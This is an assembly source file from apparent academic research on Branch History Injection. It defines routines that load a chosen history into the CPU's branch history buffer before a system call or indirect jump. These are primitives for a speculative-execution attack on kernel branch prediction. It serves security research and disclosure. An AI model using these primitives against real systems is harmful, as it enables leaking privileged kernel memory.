# Assembly code for Branch History Injection.
#
# Date: November 23, 2023
# Author: Mathé Hertogh - Vrije Universiteit Amsterdam

# Must match with HISTORY_LEN in bhi.c!
#define HISTORY_LEN 512

.intel_syntax noprefix

.section .text

# ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
# ; fill_bhb_syscall
# ; Fill the BHB with the history provided by @arg1, and subsequently perform a
# ; system call according to arguments 2-6.
# ; - arg 1 - rdi: pointer to the random history
# ; - arg 2 - rsi: syscall nr
# ; - arg 3 - rdx: syscall arg1
# ; - arg 4 - rcx: syscall arg2
# ; - arg 5 - r8: syscall arg3
# ; - arg 6 - r9: syscall arg4
# ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
.global fill_bhb_syscall
.align 4096
fill_bhb_syscall:

    .rept HISTORY_LEN
        movzx   rax, BYTE PTR [rdi]
        inc     rdi
        cmp     rax, 1
        je      1f
        1:
    .endr
    mov     rax, rsi
    mov     rdi, rdx
    mov     rsi, rcx
    mov     rdx, r8
    mov     r10, r9
    syscall
    ret

# ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
# ; clear_bhb_call
# ; Clear the BHB by filling it with a constant history, and subsequently calls
# ; the function provided by @arg1, passing the rest of the arguments in order.
# ; - arg 1 - rdi: pointer to the function to call
# ; - arg 2 - rsi: function arg1
# ; - arg 3 - rdx: function arg2
# ; - arg 4 - rcx: function arg3
# ; - arg 5 - r8: function arg4
# ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
.global clear_bhb_call
.align 4096
clear_bhb_call:

    .rept HISTORY_LEN
        mov     rax, 1
        cmp     rax, 1
        je      1f
        1:
    .endr
    mov     rax, rdi
    mov     rdi, rsi
    mov     rsi, rdx
    mov     rdx, rcx
    mov     rcx, r8
    jmp     rax
